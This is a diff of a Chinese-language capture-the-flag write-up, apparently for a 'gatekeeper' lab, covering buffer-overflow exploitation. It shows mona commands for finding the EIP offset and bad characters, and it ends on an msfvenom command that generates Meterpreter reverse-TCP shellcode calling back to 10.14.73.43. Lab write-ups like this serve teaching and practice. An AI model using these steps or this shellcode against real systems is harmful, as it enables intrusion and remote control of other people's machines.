@@ -931,9 +931,9 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 使用脚本测试缓冲区溢出所需的字节大小
 ![[Pasted image 20240310211632.png]]
 其在150字节时崩溃，重启程序后
-使用msf生成150字节的模式字节作为payload向其发送(使用：msf-pattern_create -l 长度)
+使用msf生成150字节的模式字节作为payload向其发送(使用：`msf-pattern_create -l 长度`)
 ![[Pasted image 20240310212621.png]]
-完美崩溃，在Immunity Debugger的控制台内输入!mona findmsp -distance 150
+完美崩溃，在Immunity Debugger的控制台内输入`!mona findmsp -distance 150`
 来查找这个重复的150字节模式
 ![[Pasted image 20240310213009.png]]
 可以看到EIP的offset是146
@@ -945,10 +945,24 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 可以看到四个“43”即"C"说明146bytes的offset是正确的
 接下来测试坏字符(BADCHAR),如“\\x00”这种字符在shell代码中是无法使用的，会导致shell无法成功的执行
 先设置mona插件的工作目录(接下来会用到)
-!mona config -set workingfolder c:\mona\%p
+`!mona config -set workingfolder c:\mona\%p`
 使用mona插件生成除去"\\x00"的字节对照表：
 ![[Pasted image 20240310214720.png]]
 同时将这个对照表复制到脚本中作为payload进行发送测试：
 ![[Pasted image 20240310214958.png]]
 发送后崩溃，复制ESP地址：![[Pasted image 20240310215044.png]]
 并在控制台中执行：
+`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 008B19E8`
+来与之前生成的对照表进行比较：
+![[Pasted image 20240310215240.png]]
+结果是00 0a，00我们上面已经添加过了，现在把0a从对照表及脚本的对照表Payload中剔除掉(重要)
+![[Pasted image 20240310215501.png]]
+![[Pasted image 20240310215440.png]]
+重启程序，再次执行脚本
+![[Pasted image 20240310215711.png]]
+崩溃，查看ESP地址：![[Pasted image 20240310215749.png]]
+![[Pasted image 20240310215843.png]]
+当其显示Unmodified时则说明坏字符已经被我们剔除干净
+坏字符是：`\x00\x0a`
+接下来使用msfvenom生成我们所需的shellcode
+msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=10.14.73.43 LPORT=
